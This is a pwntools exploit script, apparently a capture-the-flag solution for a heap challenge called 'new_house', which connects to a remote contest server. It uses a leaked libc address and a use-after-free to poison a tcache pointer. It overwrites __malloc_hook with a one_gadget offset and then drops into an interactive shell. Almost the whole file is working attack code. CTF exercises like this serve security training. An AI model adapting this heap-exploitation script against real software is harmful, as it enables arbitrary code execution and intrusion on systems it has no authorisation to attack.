#!/usr/bin/env python3

from pwn import *

exe = ELF("./new_house_patched")
libc = ELF("./libc.so.6")

context.binary = exe

# split tmux pane
context.terminal = ["terminator", "-x"]


context.log_level = "debug"


if args.LOCAL:
    r = gdb.debug(exe.path, gdbscript='''
        b design_room
        b add_room
                  ''')
elif args.PROCESS:
    r = process([exe.path])
else:
    r = remote("flu.xxx", 10170)

ru = lambda *x, **y: r.recvuntil(*x, **y)
rl = lambda *x, **y: r.recvline(*x, **y)
rc = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa = lambda *x, **y: r.sendafter(*x, **y)
sl = lambda *x, **y: r.sendline(*x, **y)
sn = lambda *x, **y: r.send(*x, **y)


def add(roomname, roomsize):
    sl("1")
    sla("roomname? ", roomname)
    sla("roomsize? ", roomsize)


def delete(roomnumber):
    sl("2")
    sla("roomnumber? ", roomnumber)


def design(roomnumber, data):
    sl("3")
    sla("roomnumber? ", roomnumber)
    sla("What goes into the room? ", data)


def show():
    sl("4")


def main():
    ru("ground: ")
    leak = bytes.fromhex(rl().strip().decode()[2:])
    print(leak.hex())
    libc.address = int(leak.hex(), 16)
    # overwrite tcache fd pointer
    add("aaaa", "10")
    delete("0")
    design("0", p64(libc.sym.__malloc_hook))

    # get pointer to malloc hook
    add("aaaa", "10")
    add("aaaa", "10")

    # overwrite hook with one_gadget
    design("0", p64(libc.address+0x40e36))

    # win
    add("aaaa", "10")
    r.interactive()


if __name__ == "__main__":
    main()

